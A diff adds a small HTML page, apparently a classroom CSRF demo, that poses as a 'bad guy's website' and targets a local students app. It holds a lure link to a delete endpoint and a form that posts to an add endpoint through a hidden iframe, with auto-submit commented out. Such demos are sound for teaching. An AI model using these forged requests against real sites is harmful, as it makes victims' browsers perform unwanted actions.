@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>坏人的网站</title>
+</head>
+<body>
+    <h1>这个网站中有很多你想要的东西!</h1>
+    <!-- <img src="http://localhost:3000/students/delete?id=8"> --> 
+    <a href="http://localhost:3000/students/delete?id=8">点我一下？</a>
+
+    <iframe style="display: none;" name="hello"></iframe>
+    <form action="http://localhost:3000/students/add" method="post" target="hello">
+        <input type="text" name="name" value="九灵元圣">    
+        <input type="text" name="age" value="88">
+        <input type="text" name="gender" value="女">
+        <input type="text" name="address" value="九曲盘桓洞">
+        <button>提交</button>
+    </form>
+    <script>
+        // document.forms[0].submit()
+    </script>
+</body>
+</html>
